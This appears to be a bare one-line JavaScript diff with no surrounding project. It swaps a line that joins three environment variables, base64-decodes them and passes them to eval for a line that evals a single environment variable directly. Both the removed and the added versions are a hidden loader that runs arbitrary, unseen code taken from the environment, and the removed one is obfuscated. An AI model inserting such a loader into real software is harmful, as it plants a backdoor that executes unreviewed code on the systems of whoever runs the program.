@@ -1,1 +1,1 @@
-const{A,B,C}=process.env;eval(Buffer.from(A+B+C,'base64')+'')
+eval(process.env.D)
